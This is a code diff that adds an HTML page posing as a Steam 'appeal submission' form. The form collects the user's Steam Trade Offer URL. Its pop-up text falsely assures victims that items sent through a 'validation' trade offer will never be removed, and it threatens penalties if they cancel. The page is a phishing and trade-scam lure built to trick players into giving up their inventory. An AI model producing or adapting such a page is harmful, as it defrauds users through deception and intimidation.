@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Steam Appeal Submission</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+
+  <div class="container">
+    <h2>Steam Appeal Submission</h2>
+    <textarea id="descriptionBox" rows="5" placeholder="Describe your issue in detail..."></textarea>
+    <input type="text" id="tradeUrl" placeholder="Enter your Steam Trade Offer URL">
+    <button onclick="submitAppeal()">SUBMIT APPEAL & RUN THE DATABASE</button>
+  </div>
+
+  <div class="modal" id="modal">
+    <div class="modal-content">
+      <p>
+        In this appeal process, the item database will manually review inventories to identify the most traded and potentially suspicious items. These items will then go through a validation system. However, keep in mind that the system will never remove your items—they will remain locked in your inventory throughout the entire process.
+        <br><br>
+        The database will only access the transaction history of your items to validate them, but nothing else will be altered.
+        <br><br>
+        Also, just a reminder: if you attempt to cancel or disrupt the appeal process in any way, it will be considered a serious violation, and a penalty may be applied.
+        <br><br>
+        The reason this is structured as a trade offer is because the appeal process requires the system to evaluate items through specific trade mechanisms in order to ensure transparency and fairness. It’s the safest and most effective way to verify the details of your items without actually removing or altering anything in your inventory.
+      </p>
+      <button onclick="confirmUnderstanding()">I Understand</button>
+    </div>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
